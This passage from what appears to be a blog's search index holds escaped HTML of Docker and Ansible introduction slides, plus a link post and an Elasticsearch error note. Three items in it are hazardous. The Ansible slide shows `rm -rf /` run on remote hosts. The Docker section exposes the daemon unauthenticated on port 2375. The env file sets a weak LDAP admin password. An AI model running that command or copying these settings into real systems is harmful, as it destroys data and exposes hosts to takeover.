style=\"color:#e6db74\"\u003eList all containers\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker ps -a\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eRemove alive container\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker rm -f container1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eList all containers\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker ps -a\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eRemove exit container\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker rm container2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eList all containers\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker ps -a\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch3 id=\"docker-pull-and-rmi\"\u003edocker pull AND rmi\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e. docker/status\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eList all image\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker image ls\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ePull alpine image\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker pull alpine\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eList all image\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker image ls\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch3 id=\"docker-rmi\"\u003edocker rmi\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e. docker/status\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eRemove alpine image\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker rmi alpine\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eList all image\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker image ls\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch3 id=\"prune\"\u003eprune\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker system prune -f --volumes\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch3 id=\"docker-history\"\u003edocker history\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e. docker/status\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eHistory of test1\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker history test1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eHistory of mysql:8\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker history mysql:8\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"docker-remote\"\u003eDocker remote\u003c/h2\u003e\n\u003ch3 id=\"edit-service-file\"\u003eEdit service file\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e# /lib/systemd/system/docker.service\nExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock -H tcp://0.0.0.0:2375\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"restart-service\"\u003eRestart service\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003esystemctl daemon-reload\nsystemctl restart docker\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"specify-docker_host\"\u003eSpecify DOCKER_HOST\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e. docker/status\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eList images on 192.168.185.9\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDOCKER_HOST\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e192.168.185.9:2375 docker images\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"docker-compose\"\u003eDocker-compose\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eversion\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;3\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eservices\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003esvn\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eimage\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ezeyanlin/svn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eenvironment\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eLDAP_HOSTS=${LDAP_HOSTS}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eLDAP_BASE_DN=${LDAP_BASE_DN}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eLDAP_BIND_DN=${LDAP_BIND_DN}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eLDAP_ADMIN_PASS=${LDAP_ADMIN_PASS}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eports\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e8000\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e80\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e3690\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e3690\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003edepends_on\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eldap\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003eldap\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eimage\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ezeyanlin/openldap\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eenvironment\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eLDAP_DOMAIN=${LDAP_DOMAIN}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eLDAP_ADMIN_PASS=${LDAP_ADMIN_PASS}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eports\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e389\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e389\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e636\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e636\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003ephp\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eimage\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ezeyanlin/phpldapadmin\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eenvironment\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eLDAP_HOSTS=${LDAP_HOSTS}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eports\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e80\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e80\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003edepends_on\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eldap\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch3 id=\"env\"\u003eEnv\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eLDAP_HOSTS\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eldap\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eLDAP_DOMAIN\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;knowhow.fun\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eLDAP_BASE_DN\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;dc=knowhow,dc=fun\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eLDAP_BIND_DN\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cn=admin\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eLDAP_ADMIN_PASS\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;123qwe\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["Docker","introduction","slides"],"title":"Docker Introduction"},{"categories":["Ansible"],"contents":"Getting to know Ansible. Outline Introduction Install Common modules Folder structure Conclusion Introduction 安裝部署工具、設定管理工具等\n同類型工具：Chef、Puppet、SaltStack\n不需要 Agent、透過 ssh\nLinux 有 python 即可 ( ssh port )\nWin 啟用 winrm 即可 ( 5986 port )\nhttps://docs.ansible.com/ansible/latest/user_guide/windows_winrm.html#inventory-options 資料夾結構簡單易懂、官方文件豐富易懂、模組多支援設備多、易撰寫\nInstall pip install ansible\npip3 install ansible yum install ansible\napt-get install ansible\napk add ansible\nCommon modules ping\nshell / command\nfile\nyum\nsystemd / service\ntemplate / copy\ndebug\nCommon modules - ping Common modules - shell / command Common modules - file Common modules - yum Common modules - systemd / service Common modules - template / copy Common modules - debug / register Folder structure Conclusion 選擇適合的 ansible ad-hoc ansible gitlab -m ping ansible gitlab -m shell -a 'rm -rf /' playbook role collection shell script python script others ","date":"September 26, 2020","hero":"/posts/20200926-ansible/ansible.png","permalink":"https://linzeyan.github.io/posts/20200926-ansible/","summary":"\u003ch1 id=\"getting-to-know-ansible\"\u003eGetting to know Ansible.\u003c/h1\u003e\n\u003ch2 id=\"outline\"\u003eOutline\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#Introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#Install\"\u003eInstall\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#Common-modules\"\u003eCommon modules\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#Folder-structure\"\u003eFolder structure\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#Conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch3 id=\"introduction\"\u003eIntroduction\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e安裝部署工具、設定管理工具等\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e同類型工具：Chef、Puppet、SaltStack\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e不需要 Agent、透過 ssh\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eLinux 有 python 即可 ( ssh port )\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eWin 啟用 winrm 即可 ( 5986 port )\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://docs.ansible.com/ansible/latest/user_guide/windows_winrm.html#inventory-options\" target=\"_blank\" rel=\"noopener\"\u003ehttps://docs.ansible.com/ansible/latest/user_guide/windows_winrm.html#inventory-options\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e資料夾結構簡單易懂、官方文件豐富易懂、模組多支援設備多、易撰寫\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg src=\"/posts/20200926-ansible/pics/20200926_ansible.pics/20200926_ansible0.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/posts/20200926-ansible/pics/20200926_ansible.pics/20200926_ansible1.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch3 id=\"install\"\u003eInstall\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003epip install ansible\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003epip3 install ansible\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eyum install ansible\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eapt-get install ansible\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eapk add ansible\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg src=\"/posts/20200926-ansible/pics/20200926_ansible.pics/20200926_ansible2.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch3 id=\"common-modules\"\u003eCommon modules\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"#%e5%b8%b8%e7%94%a8%e6%a8%a1%e7%b5%84-ping\"\u003eping\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"#%e5%b8%b8%e7%94%a8%e6%a8%a1%e7%b5%84-shell-command\"\u003eshell / command\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"#%e5%b8%b8%e7%94%a8%e6%a8%a1%e7%b5%84-file\"\u003efile\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"#%e5%b8%b8%e7%94%a8%e6%a8%a1%e7%b5%84-yum\"\u003eyum\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"#%e5%b8%b8%e7%94%a8%e6%a8%a1%e7%b5%84-systemd-service\"\u003esystemd / service\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"#%e5%b8%b8%e7%94%a8%e6%a8%a1%e7%b5%84-template-copy\"\u003etemplate / copy\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"#%e5%b8%b8%e7%94%a8%e6%a8%a1%e7%b5%84-debug\"\u003edebug\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch4 id=\"common-modules---ping\"\u003eCommon modules - ping\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"/posts/20200926-ansible/pics/20200926_ansible.pics/20200926_ansible3.png\" alt=\"\"\u003e\u003c/p\u003e","tags":["Ansible","introduction","slides"],"title":"Ansible Introduction"},{"categories":["URL","bayonet"],"contents":" [分享]鑰匙圈 - 五七步槍刺刀鞘的墬子 ","date":"July 10, 2020","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20200710-bayonet-rope/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.mobile01.com/topicdetail.php?f=637\u0026amp;t=282596\" target=\"_blank\" rel=\"noopener\"\u003e[分享]鑰匙圈 - 五七步槍刺刀鞘的墬子\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","bayonet"],"title":"[分享]鑰匙圈 - 五七步槍刺刀鞘的墬子"},{"categories":null,"contents":" Data too large [parent] Data too large, data for [\u0026lt;http_request\u0026gt;] would be [123848638/118.1mb], which is larger than the limit of [123273216/117.5mb], real usage: [120182112/114.6mb], new bytes reserved: [3666526/3.4mb]\nhttps://www.elastic.co/guide/en/elasticsearch/reference/7.14/fix-common-cluster-issues.html#circuit-breaker-errors\n","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/elasticsearch/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eData too large\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cp\u003e\u003ccode\u003e[parent] Data too large, data for [\u0026lt;http_request\u0026gt;] would be [123848638/118.1mb], which is larger than the limit of [123273216/117.5mb], real usage: [120182112/114.6mb], new bytes reserved: [3666526/3.4mb]\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://www.elastic.co/guide/en/elasticsearch/reference/7.14/fix-common-cluster-issues.html#circuit-breaker-errors\" target=\"_blank\" 